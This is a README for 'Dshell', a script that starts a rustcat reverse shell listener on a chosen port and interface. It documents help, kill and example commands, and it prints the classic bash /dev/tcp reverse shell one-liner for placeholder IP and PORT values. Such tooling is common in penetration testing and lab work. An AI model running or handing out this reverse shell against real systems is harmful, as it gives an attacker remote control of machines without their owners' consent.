## Dshell

> "A reverse shell shows that true control comes when the target reaches back willingly."

**Dshell** is a reverse shell script that prepares a responsive shell on a specified port using [rustcat](https://github.com/robiot/rustcat).

---

### Features

* Quickly set up a reverse shell listener.
* Kill running Dshell processes on demand.
* Supports multiple network interfaces by default.

---

### Installation

Ensure [rustcat](https://github.com/robiot/rustcat) is installed on your system.

---

### Usage

#### Help Menu

```sh
dshell -h

[Info] Usage:
    /usr/local/bin/dshell -p <PORT> [IFACE|IP]
    /usr/local/bin/dshell -k <PORT|all>
```

---

#### Run a Listener

```sh
dshell -p <PORT> [IFACE|IP]
```

Dshell will output the most commonly used reverse shell `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` with the supplied IP and PORT
If no interface or IP is supplied, Dshell will try the following interfaces in order:

* `tun1`
* `tun0`
* `wlan0`
* `eth0`
* `lo`

---

#### Kill Running Processes

```sh
dshell -k <PORT|all>
```

* `<PORT>` 		– Kill Dshell process running on a specific port.
* `all` 		– Kill all Dshell processes.

---

#### Examples

Start a listener on port `4444` using tun0 interface:

```sh
dshell -p 4444 tun0
```

Start a listener on port `4444` using the IP 1.1.1.1:

```sh
dshell -p 4444 1.1.1.1
```

Kill all running Dshell processes:

```sh
dshell -k all
```

Kill Dshell processe that is listening on port 4444:

```sh
dshell -k 4444
```
